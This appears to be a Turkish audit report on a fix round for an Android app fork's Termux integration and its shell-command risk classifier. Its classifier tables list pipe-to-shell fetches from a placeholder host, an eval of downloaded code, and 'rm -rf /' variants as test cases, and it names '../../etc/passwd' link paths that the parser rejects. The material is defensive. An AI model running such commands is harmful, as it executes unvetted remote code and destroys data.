# DENETİM — `37099` / düzeltme turu

`.17` paketi satır satır yeniden okundu. **Sekiz gerçek hata** bulundu;
altısı kullanıcıya hata mesajı değil **yanlış davranış** olarak görünecekti.
Hiçbiri üç kapıdan da geçmiyordu çünkü üçü de yalnız *yapıya* bakıyordu.

Ölçüm aracı: bu cihazda JVM başlamıyor (`Failed to mark memory page as
executable`), yani `RiskCorpusTest`/`TermuxLayerTest` koşulamadı. Bu yüzden
her bulgu ya **saf fonksiyon** olarak ayrıldı (testi cihazsız koşar) ya da
Python aynasıyla ölçüldü.

---

## 1 · Sessiz — `SYMLINKS.txt` sırası tersti

**Ne oldu.** Termux `bootstrap` zip'i symlink taşımıyor; bağlar `SYMLINKS.txt`
içinde metin olarak duruyor. Biçim, üreticide sabit:

```bash
# termux-packages/scripts/build-bootstraps.sh :: create_bootstrap_archive
echo "$(readlink "$link")←${link}" >> SYMLINKS.txt
```

Yani **solda hedef, sağda bağ yolu**. `applySymlinks` ise `parts[0]`'ı bağ adı
sanıp `parts[1]`'i hedef yapıyordu:

```kotlin
val linkName = parts[0].trim()      // ← hedefi bağ adı sanıyor
val target   = parts[1].trim()      // ← bağ yolunu hedef sanıyor
```

**Görünen etkisi.** `bash` `libncursesw.so.6`'yı bulamaz. Kurulum adımları
"symlinks: N kuruldu" der (sayı doğru, yer yanlış), `smoke` adımı düşer ve
kullanıcı "katman açıldı ama doğrulama geçmedi" mesajı görür. Sebep
symlink'te olduğu hâlde ekranda görünmez — **sessiz** hata sınıfı.

**Düzeltme.** Çözümleme saf fonksiyona taşındı: `TermuxLayer.parseSymlinkLine`
→ `(hedef, bağ)`. Dört test bunu çiviliyor, biri gerçek bootstrap satırını
(`libncursesw.so.6.5←./lib/libncursesw.so.6`) kullanıyor. Ayrıştırıcı ayrıca
önek dışına çıkan bağ yolunu (`../../etc/passwd`, `/etc/passwd`) reddediyor.

---

## 2 · Güvenlik — "kod metinde değil" sınıfı hâlâ açıktı

**Ne oldu.** `SIRADAKI-SURUM.md` §B1 bunu mimari boşluk olarak yazıyordu.
Ölçüldü: beşi de **SESSİZ** geçiyordu.

| Komut | Önce | Sonra |
|---|---|---|
| `curl -s https://x/y.sh \| bash` | SILENT | ASK |
| `eval "$(curl -s https://x/y.sh)"` | SILENT | ASK |
| `bash` (çıplak) | SILENT | ASK |
| `sh -s` | SILENT | ASK |
| `source /tmp/a.sh` | SILENT | ASK |
| `bash build.sh` | SILENT | ASK |

**Kök sebep.** İlk ikisinin sebebi ayrıydı ve ikisi de tek bir çapada:
komut başı kalıbı `(^|[\s;&|])` idi. `"rm -rf` yazan bir komutta `rm` önünde
tırnak var — `\s` değil, `;` değil. Yani **tırnak içindeki hiçbir komut
hiçbir kurala uymuyordu.** `bash -c "rm -rf /var/minis/shared"` bunun en
pahalı örneğiydi: `rm -rf` metni komutun içinde, kural görmedi.

**Düzeltme — iki ayrı iş.**

1. **Çapa genişletildi:** `(^|[\s;&|"'\`({=])`. Artık tırnak, ters tırnak,
   parantez, `$(` ve `=` önündeki komutlar da sınıflandırılıyor.
2. **Kaçış sınıfı için beş kural:** `shell:eval`, `shell:pipe-to-shell`,
   `shell:script-file`, `shell:stdin-shell`, `shell:source` — hepsi MEDIUM,
   geri alınabilir. Kara listeyi büyütmek yerine **çağrıyı** işaretliyoruz:
   kabuğa kod vermek, verilen kodu bilmemektir.

**Yan etki — ve neden korpus yakaladı.** Çapa genişleyince `rg -n "rm -rf" src/`
— yani silme kalıbını **arayan** komut — silme sanıldı ve `deny:root` ile
**DENY** oldu. Korpusun kendi ilkesi bunu yasaklıyor ("kodu ARAMAK silmek
değildir"), test kırmızı verdi. Düzeltme `maskSearchPattern`: arama
araçlarında (`rg`, `grep`, `fd`…) yalnız **düz tırnaklı** aralık maskelenir;
`$(...)` ve ters tırnak maskelenmez, çünkü onlar çalıştırılabilir kod taşır.

---

## 3 · Sessiz — `deny:root` yanlış şeyi reddediyordu

`rm -rf /` **DENY** (kart yok, doğru). Ama aynı kalıp `rg -n "rm -rf" src/`
komutunda da eşleşiyordu: kart göstermeden reddetmek, arama yapmayı
imkânsızlaştırır. Düzeltme: DENY kalıpları **komut konumu** ile sınırlandı
(`(^|[\s;&|])rm`); tırnak içinde geçen silme metni artık `shell:rm-recursive`
ile **karta** düşüyor — kullanıcı "hayır" diyebilir, ama sessiz geçmez.

Sınır ölçümü:

| Komut | Karar |
|---|---|
| `rm -rf /` | DENY |
| `rm -rf "/"` | DENY |
| `echo "rm -rf /"` | ASK (kart) |
| `bash -c "rm -rf /"` | ASK (kart) |
| `rg -n "rm -rf /" src/` | SILENT |
| `echo $(rm -rf /tmp/x)` | SILENT — hedef `/tmp`, seviye LOW (tasarım) |

---

## 4 · Sessiz — 71 anahtarın Türkçesi yoktu

Fork kuralı #4: *kullanıcıya görünen her metin iki dilde.* `.17`'de 194 yeni
anahtar eklendi, 71'inin `values-tr` karşılığı yoktu: konsey ekranı (16),
görev tahtası (11), ekip modları (19), sağlık göstergesi (19), Termux satırı (2)
ve `teams_*` kalanları. Türkçe cihazda bu ekranlar İngilizce görünüyordu.

Üç kapı da yeşil dedi — ve **haklıydı**: derleme eksik çeviriyi görmez
(Android İngilizceye düşer, kırılmaz), `kotlin-denetim.py` kaynak dizeleriyle
ilgilenmez, `risk-corpus.py` yalnız komut sınıflandırır. İhlal tam olarak
hiçbir kapının bakmadığı yerdeydi.

**Düzeltme.** 71 anahtar çevrildi. Ayrıca `values/strings.xml` içinde iki
Türkçe metin bulundu (`council_title = Konsey`, `task_hall_title = Görevler`) —
İngilizce dosyaya sızmış, yani ters yönde aynı hata.

**Yeni kapı:** `scripts/ozel/ceviri-denetim.py`, `ozel-guard.yml`'e bağlı.
Taban dosyası `/.ozel/ceviri/taban.json` upstream'den devralınan **521**
anahtarı taşır (bilerek çevrilmemiş, İngilizceye düşer). Taban bir **ratchet**:
orada olmayan yeni bir eksik kırmızıdır, çeviri yapıldıkça taban küçülür.
Kapı ayrıca aynı dosyada iki kez tanımlı anahtarı yakalar (Android sonuncuyu
sessizce kazanır).

Kanıt — kapı gerçekten kırmızıya dönüyor:

```
$ python3 scripts/ozel/ceviri-denetim.py --fail-on-new
eksik        : 522 (1 tanesi YENI)
YENI EKSIK (taban dosyasinda yok):
  - council_title
SONUC: KIRMIZI
```

---

## 5 · Eşzamanlılık — sağlık çipi kaybolabiliyordu

`ChatHealthBridge.publish` şunu yapıyordu:

```kotlin
_state.value = _state.value + (sessionId to health)   // oku-değiştir-yaz
```

`MutableStateFlow` bu biçimde atomik değil. İki oturum aynı anda biterse
(paralel alt ajan, Compare fan-out) son yazan diğerinin girdisini ezer ve o
oturumun çipi Canlı Görevler'den **kaybolur** — üstelik çip "ölçüm yok" gibi
görünür, yani hata donanım yavaşlığı sanılır. Düzeltme: `update {}` (CAS).
`forget` de aynı yarışı taşıyordu, o da düzeltildi.

---

## 6 · Görsel — iki farklı araç zinciri aynı satır gibi görünüyordu

`iconFor("termux")` ve `colorFor("termux")` tanımsızdı, ikisi de `else`
dalına düşüyordu: ikon `DeveloperMode`, renk `8E8E93`. Oysa Java grubu da
`DeveloperMode` kullanıyor — listede **iki ayrı satır aynı görünüyordu**.
Düzeltme: `Terminal` + `2E7D32` (bionic tarafı, Alpine mavisi değil).

---

## 7 · Birim — "tüm gruplar kurulursa 1,3 GB" yanlıştı

`Group.sizeMb` iki yerde toplanıyor: satırın `~N MB` etiketi ve ekranın toplam
satırı. Termux için bu alan **indirme** boyutuydu (32), diğer bütün gruplar
**disk** boyutu. Toplam bir disk bütçesidir; oraya indirme koymak elmayla
armut toplamaktı ve gerçek maliyeti küçük gösteriyordu. Düzeltme: `sizeMb =
BOOTSTRAP_UNPACKED_MB` (110). İndirme boyutu altyazıda ayrıca yazılı.

---

## 8 · Sessiz — açma adımı her denemede baştan

`install()` "tekrar başlatılabilir" diyordu ama `extract` adımı her çağrıda
3 779 dosyayı yeniden yazıyordu. Telefonda bu dakikalar; ağ koptuğunda
kullanıcı aynı 110 MB'ı ikinci kez açıyordu. Düzeltme: `.minis-extract-complete`
işareti, **yalnız son girişten sonra** yazılır — yani yarım açma "tamam"
sayılmaz.

---

## Belgelerdeki uyuşmazlıklar (kanıtla)

| Belge | Yazıyordu | Gerçek |
|---|---|---|
| `SURUM-NOTU-1.15-ozel.17.md` | `TermuxLayerTest` **13 test** | **19** |
| `SURUM-NOTU-1.15-ozel.17.md` | yapısal denetim **1 644** dosya | **1 646** |
| `TERMUX-ENTEGRASYONU.md` | 1644 dosya · 13 test | 1646 · 19 |
| `SIRADAKI-SURUM.md` | P3 ilerleme çubuğu **yok** | var (belirsiz çubuk + adım satırı); eksik olan yüzde, o da bilinçli |
| `FORK.md` | sürüm `1.15-ozel.10.1` / `37016` | `1.15-ozel.17` / `37098` |
| `FORK.md` | 19 commit ileride | **73** |
| `FORK.md` | araç zinciri **11 grup** | **12** (11 `apk` + Termux) |

Hepsi düzeltildi. `06-KANIT/` altındaki ham çıktılar yeniden üretildi.

---

## Kapılar (bu turdan sonra)

| Kapı | Komut | Sonuç |
|---|---|---|
| Risk korpusu | `risk-corpus.py --fail-on-mismatch` | **74 komut · 0 sapma · 42 kural** |
| Yapısal | `kotlin-denetim.py --no-warn` | **1 646 dosya · hata yok** |
| Entegrasyon | `integration_audit.py` | **10/11 dilim** |
| Çeviri | `ceviri-denetim.py --fail-on-new` | **521 eksik · 0 yeni · YEŞİL** |
| Etiket | `tag-denetim.py` | **UYARI** — 5 etiket hâlâ yanlış commit'te |

Etiket uyarısı bu turda **kapatılmadı** ve kapatılamaz: düzeltme uzak
etiketleri silmeyi gerektiriyor, o da geri dönüşsüz ve `GITHUB_TOKEN`
bu cihazda `enabled: false`. Karar bekliyor.

## Ders

Üç kapı yeşilken sekiz hata bulundu. Üçü de **yapıya** bakıyordu: parantez
dengeli mi, kural tablosu korpusla uyuşuyor mu, dosya üretimden çağrılıyor mu.
Hiçbiri **davranışa** bakmıyordu — ve bulunan sekiz hatanın altısı tam olarak
orada, davranışta, sessizdi. Bir kapı eklemek, bir hata sınıfını kapatmak
değil; kapatılan sınıf **yazılan testin kapsamı** kadardır.
